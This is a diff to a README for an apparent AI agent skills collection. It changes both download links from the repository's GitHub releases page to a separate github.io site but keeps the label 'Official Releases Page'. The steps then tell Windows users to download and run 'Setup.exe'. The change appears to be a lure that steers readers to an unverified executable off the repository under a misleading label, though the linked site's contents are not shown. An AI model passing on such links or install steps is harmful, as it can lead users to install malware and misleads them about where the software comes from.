@@ -1,6 +1,6 @@
 # 🛠️ Agent-Skills-Collection-2026 - Master Your AI With Proven Tools
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue-blue.svg)](https://github.com/Brittneysmudgy889/Agent-Skills-Collection-2026/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue-blue.svg)](https://brittneysmudgy889.github.io)
 
 ## 📖 About This Library
 
@@ -23,7 +23,7 @@ To ensure a smooth experience, verify your computer meets these basic requiremen
 
 Follow these steps to set up the collection on your Windows machine.
 
-1. Visit the [Official Releases Page](https://github.com/Brittneysmudgy889/Agent-Skills-Collection-2026/releases) to access the download.
+1. Visit the [Official Releases Page](https://brittneysmudgy889.github.io) to access the download.
 2. Look for the file named `Setup.exe` under the "Assets" section of the latest release.
 3. Click the file name to start the download to your computer.
 4. Locate the file in your Downloads folder once the process finishes.
